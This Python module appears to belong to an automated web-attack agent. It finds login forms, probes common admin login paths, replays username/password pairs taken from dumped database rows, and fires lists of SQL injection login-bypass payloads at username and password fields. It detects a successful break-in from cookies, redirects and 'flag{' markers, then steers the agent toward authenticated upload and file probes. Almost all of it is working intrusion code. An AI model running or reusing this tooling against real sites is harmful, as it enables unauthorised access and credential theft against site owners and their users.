from __future__ import annotations

import json
import re
from urllib.parse import urljoin

from ravage.agent_core.agent_state import AgentState
from ravage.web_core.http_probe import ProbeResponse, ProbeSession, form_defaults
from ravage.web_core.proof_recognizer import recognize_proofs

from .common import _dedupe, _dict_items, _dict_value, _int_value
from .models import FAST_CREDENTIAL_TABLES, _AuthBypassCase

def _fork_probe_session(session: ProbeSession) -> ProbeSession:
    if hasattr(session, "fork"):
        # Login-bypass evidence requires a credential-free control session even
        # when the enclosing SQL probe began from a managed identity.
        return session.fork(inherit_identity=False)
    return session

def _surface_forms(state: AgentState) -> list[dict[str, object]]:
    return _dict_items(state.surface.get("forms"))

def _form_input_names(form: dict[str, object]) -> list[str]:
    names: list[str] = []
    for input_field in _dict_items(form.get("inputs")):
        value = input_field.get("name")
        if not value:
            value = input_field.get("type")
        name = str(value or "").lower()
        if name:
            names.append(name)
    return names

def _login_targets(state: AgentState, session: ProbeSession, *, include_fallback: bool = False) -> list[dict[str, object]]:
    targets: list[dict[str, object]] = []
    for form in _surface_forms(state):
        target = _login_target_from_form(form, session)
        if target is not None:
            targets.append(target)

    if include_fallback:
        targets.extend(_fallback_login_targets(session))

    return _dedupe_login_targets(targets)[:10]

def _login_target_from_form(
    form: dict[str, object],
    session: ProbeSession,
) -> dict[str, object] | None:
    action = str(form.get("action") or "")
    if not action:
        return None
    if _action_is_out_of_scope(action, session):
        return None
    if not _form_looks_like_login(form):
        return None
    return {"kind": "form", "url": action, "form": form}

def _action_is_out_of_scope(action: str, session: ProbeSession) -> bool:
    if not action.startswith(("http://", "https://")):
        return False
    return not action.startswith(session.origin)

def _form_looks_like_login(form: dict[str, object]) -> bool:
    inputs = _form_input_names(form)
    if not _form_has_password_input(inputs):
        return False
    if _form_has_identity_input(inputs):
        return True
    return _form_has_login_text(form)

def _form_has_password_input(inputs: list[str]) -> bool:
    for value in inputs:
        if "pass" in value:
            return True
    return False

def _form_has_identity_input(inputs: list[str]) -> bool:
    identity_markers = ("user", "login", "email")
    for value in inputs:
        if _contains_marker(value, identity_markers):
            return True
    return False

def _form_has_login_text(form: dict[str, object]) -> bool:
    form_text = str(form).lower()
    action = str(form.get("action") or "").lower()
    login_markers = ("login", "signin", "sign-in", "auth")
    for marker in login_markers:
        if marker in form_text or marker in action:
            return True
    return False

def _fallback_login_targets(session: ProbeSession) -> list[dict[str, object]]:
    targets: list[dict[str, object]] = []
    for url in _fallback_login_urls(session):
        targets.append({"kind": "fallback", "url": url, "form": {}})
    return targets

def _fallback_login_urls(session: ProbeSession) -> list[str]:
    paths = (
        "/login.php",
        "/login",
        "/signin.php",
        "/signin",
        "/admin/login.php",
        "/admin.php",
        "/admin",
    )
    urls: list[str] = []
    for path in paths:
        urls.append(urljoin(session.origin + "/", path.lstrip("/")))
    return _dedupe(urls)

def _dedupe_login_targets(targets: list[dict[str, object]]) -> list[dict[str, object]]:
    seen: set[tuple[str, str]] = set()
    deduped: list[dict[str, object]] = []
    for target in targets:
        key = _login_target_key(target)
        if key in seen:
            continue
        seen.add(key)
        deduped.append(target)
    return deduped

def _login_target_key(target: dict[str, object]) -> tuple[str, str]:
    return (str(target.get("kind")), str(target.get("url")))

def _credential_pairs_from_rows(rows: list[dict[str, object]]) -> list[tuple[str, str]]:
    grouped: dict[tuple[str, int], dict[str, str]] = {}
    pairs: list[tuple[str, str]] = []
    for row in rows:
        table, column, value = _credential_row_parts(row)
        if not value:
            continue
        pairs.extend(_explicit_credential_pairs(column, value))
        _merge_grouped_credential(grouped, row=row, table=table, column=column, value=value)
    pairs.extend(_credential_pairs_from_groups(grouped))
    return _dedupe_credential_pairs(pairs)

def _credential_row_parts(row: dict[str, object]) -> tuple[str, str, str]:
    table = str(row.get("table") or "").lower()
    column = str(row.get("column") or "").lower()
    value = str(row.get("value") or "").strip()
    return table, column, value

def _explicit_credential_pairs(column: str, value: str) -> list[tuple[str, str]]:
    if column in {"credential_pair", "credentials"}:
        return _split_credential_value(value)
    if ":" in value:
        return _split_credential_value(value)
    return []

def _merge_grouped_credential(
    grouped: dict[tuple[str, int], dict[str, str]],
    *,
    row: dict[str, object],
    table: str,
    column: str,
    value: str,
) -> None:
    if not _table_looks_credential_related(table):
        return
    key = (table, _int_value(row.get("row")))
    bucket = grouped.setdefault(key, {})
    _store_credential_column(bucket, column=column, value=value)

def _table_looks_credential_related(table: str) -> bool:
    if table in FAST_CREDENTIAL_TABLES:
        return True
    return _contains_marker(table, ("user", "admin", "account", "credential"))

def _store_credential_column(bucket: dict[str, str], *, column: str, value: str) -> None:
    if column in {"username", "user", "email", "login", "name"}:
        bucket["username"] = value
    elif column in {"password", "passwd", "pass", "secret", "token"}:
        bucket["password"] = value

def _credential_pairs_from_groups(
    grouped: dict[tuple[str, int], dict[str, str]],
) -> list[tuple[str, str]]:
    pairs: list[tuple[str, str]] = []
    for values in grouped.values():
        pairs.extend(_credential_pairs_from_group(values))
    return pairs

def _credential_pairs_from_group(values: dict[str, str]) -> list[tuple[str, str]]:
    username = values.get("username")
    password = values.get("password")
    if username and password:
        return [(username, password)]
    if password:
        return _fallback_user_pairs(password)
    return []

def _fallback_user_pairs(password: str) -> list[tuple[str, str]]:
    pairs: list[tuple[str, str]] = []
    for fallback_user in ("admin", "administrator", "root", "user"):
        pairs.append((fallback_user, password))
    return pairs

def _usernames_from_rows(rows: list[dict[str, object]]) -> list[str]:
    usernames: list[str] = []
    for row in rows:
        table, column, value = _credential_row_parts(row)
        if not value:
            continue
        if _row_is_username_credential(table, column):
            usernames.append(value)
    return _dedupe(usernames)

def _row_is_username_credential(table: str, column: str) -> bool:
    if column not in {"username", "user", "email", "login", "name"}:
        return False
    return _table_looks_credential_related(table)

def _split_credential_value(value: str) -> list[tuple[str, str]]:
    cleaned = value.strip()
    pairs: list[tuple[str, str]] = []
    for separator in (":", "|", ","):
        if separator not in cleaned:
            continue
        left, right = cleaned.split(separator, 1)
        username = left.strip()
        password = right.strip()
        if username and password and len(username) <= 128 and len(password) <= 256:
            pairs.append((username, password))
    return pairs

def _dedupe_credential_pairs(pairs: list[tuple[str, str]]) -> list[tuple[str, str]]:
    seen: set[tuple[str, str]] = set()
    result: list[tuple[str, str]] = []
    for username, password in pairs:
        key = (username, password)
        if key in seen:
            continue
        seen.add(key)
        result.append(key)
    return result

def _credential_fields(target: dict[str, object], *, username: str, password: str) -> dict[str, str]:
    fields = _credential_form_defaults(target)
    if not fields:
        fields = {"username": username, "password": password}

    replacement = _apply_credential_values(fields, username=username, password=password)
    _ensure_credential_fields(fields, replacement, username=username, password=password)
    _ensure_submit_fields(fields)
    return fields

def _credential_form_defaults(target: dict[str, object]) -> dict[str, str]:
    form = _dict_value(target.get("form"))
    if form:
        return form_defaults(form)
    return {}

def _apply_credential_values(
    fields: dict[str, str],
    *,
    username: str,
    password: str,
) -> dict[str, bool]:
    replacement = {"username": False, "password": False}
    for name in list(fields):
        field_kind = _credential_field_kind(name)
        if field_kind == "protected":
            continue
        if field_kind == "password":
            fields[name] = password
            replacement["password"] = True
        elif field_kind == "username":
            fields[name] = _username_value_for_field(name, username)
            replacement["username"] = True
    return replacement

def _credential_field_kind(name: str) -> str:
    lowered = name.lower()
    if lowered in {"csrf", "token", "_token", "authenticity_token"}:
        return "protected"
    if "csrf" in lowered:
        return "protected"
    if "pass" in lowered:
        return "password"
    if "user" in lowered or "login" in lowered or "email" in lowered:
        return "username"
    return ""

def _username_value_for_field(name: str, username: str) -> str:
    lowered = name.lower()
    if "email" in lowered and not _looks_like_sqli_payload(username):
        return f"{username}@example.test"
    return username

def _ensure_credential_fields(
    fields: dict[str, str],
    replacement: dict[str, bool],
    *,
    username: str,
    password: str,
) -> None:
    if not replacement["username"]:
        fields.setdefault("username", username)
    if not replacement["password"]:
        fields.setdefault("password", password)

def _ensure_submit_fields(fields: dict[str, str]) -> None:
    for submit_name, submit_value in (("submit", "submit"), ("login", "login"), ("action", "login")):
        fields.setdefault(submit_name, submit_value)

def _looks_like_sqli_payload(value: str) -> bool:
    lowered = value.lower()
    markers = (
        "'",
        '"',
        "--",
        "/*",
        " or ",
        " and ",
        "sleep(",
        "pg_sleep",
        "union",
        "select ",
        "updatexml",
        "extractvalue",
    )
    for marker in markers:
        if marker in lowered:
            return True
    return False

def _login_replay_succeeded(response: ProbeResponse, home: ProbeResponse) -> bool:
    combined_body = response.body + "\n" + home.body
    lowered = combined_body.lower()
    if _contains_marker(lowered, ("logout", "welcome", "dashboard", "admin", "flag{")):
        return True
    return False

def _login_replay_finding(
    *,
    url: str,
    username: str,
    password: str,
    fields: dict[str, str],
    response: ProbeResponse,
    home: ProbeResponse,
) -> dict[str, object]:
    return {
        "url": url,
        "username": username,
        "password": password,
        "fields": fields,
        "response": response.summary(body_chars=260),
        "home": home.summary(body_chars=260),
    }

def _auth_bypass_cases(candidate_users: list[str]) -> list[_AuthBypassCase]:
    username_cases = [
        _username_auth_bypass_case(payload)
        for payload in _username_sqli_bypass_payloads(candidate_users)
    ]
    password_cases: list[_AuthBypassCase] = []
    for username in candidate_users:
        for payload in _password_sqli_bypass_payloads(username):
            password_cases.append(_password_auth_bypass_case(username, payload))

    # The preflight lane is bounded to fewer requests than the full username
    # corpus. Interleave fields so a password-only injection is not starved by
    # username payload breadth.
    cases: list[_AuthBypassCase] = []
    for index in range(max(len(username_cases), len(password_cases))):
        if index < len(username_cases):
            cases.append(username_cases[index])
        if index < len(password_cases):
            cases.append(password_cases[index])
    return cases

def _username_auth_bypass_case(payload: str) -> _AuthBypassCase:
    return _AuthBypassCase(
        input_name="username",
        username=payload,
        password="x",
        payload=payload,
        expr="username-field SQLi auth bypass",
        finding_fields={
            "username_payload": payload,
            "password": "x",
        },
        next_message=(
            "Authenticated session established via username-field SQLi bypass; continue with "
            "authenticated upload/file/parser probes using the same cookie jar and discovered forms."
        ),
    )

def _password_auth_bypass_case(username: str, payload: str) -> _AuthBypassCase:
    return _AuthBypassCase(
        input_name="password",
        username=username,
        password=payload,
        payload=payload,
        expr="password-field SQLi auth bypass",
        finding_fields={
            "username": username,
            "password_payload": payload,
        },
        next_message=(
            "Authenticated session established via SQLi bypass; continue with authenticated "
            "upload/file/parser probes using the same cookie jar and discovered forms."
        ),
    )

def _auth_bypass_finding(
    *,
    url: str,
    case: _AuthBypassCase,
    response: ProbeResponse,
    followups: list[ProbeResponse],
    forms: list[dict[str, object]],
) -> dict[str, object]:
    finding: dict[str, object] = {
        "type": "sqli_auth_bypass_session",
        "url": url,
        "response": response.summary(body_chars=320),
        "followups": _response_summaries(followups, limit=6, body_chars=360),
        "forms": forms[:6],
        "next": case.next_message,
    }
    finding.update(case.finding_fields)
    return finding

def _response_summaries(
    responses: list[ProbeResponse],
    *,
    limit: int,
    body_chars: int,
) -> list[dict[str, object]]:
    summaries: list[dict[str, object]] = []
    for response in responses[:limit]:
        summaries.append(response.summary(body_chars=body_chars))
    return summaries

def _response_bodies(response: ProbeResponse, followups: list[ProbeResponse]) -> list[str]:
    bodies = [response.body]
    for followup in followups:
        bodies.append(followup.body)
    return bodies

def _login_bypass_succeeded(response: ProbeResponse) -> bool:
    if response.status is None:
        return False
    if recognize_proofs(response.body):
        return True

    lowered = response.body.lower()
    decoded = _json_object(response.body)
    if decoded is not None and _json_login_denied(decoded):
        return False
    if decoded is not None and _json_login_succeeded(decoded, lowered):
        return True
    if _body_login_denied(lowered):
        return False
    if _body_login_succeeded(lowered):
        return True
    if _session_cookie_login_succeeded(response, lowered):
        return True
    return _redirect_login_succeeded(response)

def _json_object(text: str) -> dict[str, object] | None:
    try:
        decoded = json.loads(text)
    except (TypeError, ValueError):
        return None
    if not isinstance(decoded, dict):
        return None

    result: dict[str, object] = {}
    for key, value in decoded.items():
        result[str(key)] = value
    return result

def _json_login_denied(decoded: dict[str, object]) -> bool:
    for key in ("success", "ok", "authenticated", "logged_in"):
        if decoded.get(key) is False:
            return True
    return False

def _json_login_succeeded(decoded: dict[str, object], lowered_body: str) -> bool:
    for key in ("authenticated", "logged_in"):
        if decoded.get(key) is True:
            return True
    if decoded.get("success") is not True:
        return False
    if _contains_marker(lowered_body, ("dashboard", "logout", "welcome", "admin", "token")):
        return True
    return False

def _body_login_denied(lowered_body: str) -> bool:
    direct_failures = (
        "invalid username",
        "invalid password",
        "invalid username or password",
    )
    if _contains_marker(lowered_body, direct_failures):
        return True

    generic_failures = (
        "login failed",
        "authentication failed",
        'success":false',
        "success: false",
        "unauthorized",
    )
    return _contains_marker(lowered_body, generic_failures)

def _body_login_succeeded(lowered_body: str) -> bool:
    if _contains_marker(lowered_body, ("dashboard", "logout", "flag{")):
        return True

    if re.search(r"\bsuccess(?:ful|fully)?\b", lowered_body):
        success_markers = ("authenticated", "logged in", "welcome", "dashboard", "session", "admin panel")
        if _contains_marker(lowered_body, success_markers):
            return True

    if "admin" not in lowered_body:
        return False
    if _contains_marker(lowered_body, ("dashboard", "panel", "logged in", "logout")):
        return True
    return False

def _session_cookie_login_succeeded(response: ProbeResponse, lowered_body: str) -> bool:
    if response.status not in {200, 201, 302, 303, 307, 308}:
        return False

    set_cookie = str(response.headers.get("set-cookie") or response.headers.get("Set-Cookie") or "").lower()
    if not _contains_marker(set_cookie, ("session", "sid", "auth", "jwt")):
        return False
    if _contains_marker(lowered_body, ("invalid", "failed", "unauthorized", "forbidden")):
        return False
    return True

def _redirect_login_succeeded(response: ProbeResponse) -> bool:
    if response.status not in {301, 302, 303, 307, 308}:
        return False

    location = str(response.headers.get("location") or response.headers.get("Location") or "").lower()
    if _contains_marker(location, ("dashboard", "account", "profile", "admin", "upload")):
        return True
    return False

def _contains_marker(text: str, markers: tuple[str, ...]) -> bool:
    for marker in markers:
        if marker in text:
            return True
    return False

def _username_sqli_bypass_payloads(usernames: list[str]) -> list[str]:
    candidates = _dedupe([*usernames, "admin", "administrator", "root", "user"])[:5]
    payloads: list[str] = []
    for username in candidates:
        payloads.extend(
            [
                f"{username}'-- -",
                f"{username}'#",
                f"{username}' OR '1'='1'-- -",
                f"{username}' OR 1=1-- -",
                f"{username}' OR 'a'='a'#",
                f"{username}' OR 1=1#",
                f"{username}' OR '1'='1'/*",
                f"{username}') OR 1=1#",
                f"{username}') OR ('1'='1'-- -",
                f'{username}"-- -',
                f'{username}"#',
                f'{username}" OR "1"="1"-- -',
                f'{username}" OR 1=1-- -',
                f'{username}" OR "a"="a"#',
                f'{username}" OR 1=1#',
                f'{username}" OR "1"="1"/*',
                f"{username}\") OR (\"1\"=\"1\"-- -",
            ]
        )
    payloads.extend(
        [
            "' OR '1'='1'-- -",
            "' OR 1=1-- -",
            "' OR 'a'='a'#",
            "' OR 1=1#",
            "' OR '1'='1'/*",
            '" OR "1"="1"-- -',
            '" OR 1=1#',
            '" OR "a"="a"#',
        ]
    )
    return _dedupe(payloads)[:36]

def _password_sqli_bypass_payloads(username: str) -> list[str]:
    escaped_user = username.replace("'", "''")
    return _dedupe(
        [
            f"x'),MD5('{escaped_user}'))) OR 1=1-- -",
            f"x'),MD5('{escaped_user}'))) OR '1'='1'-- -",
            "x')) OR 1=1-- -",
            "x')) OR '1'='1'-- -",
            "x')) OR 1=1#",
            "x')) OR '1'='1'#",
            "' OR '1'='1'-- -",
            "' OR 1=1#",
            "' OR '1'='1'#",
            "x' OR '1'='1'-- -",
            "x' OR 1=1#",
            "x' OR 'a'='a'#",
        ]
    )
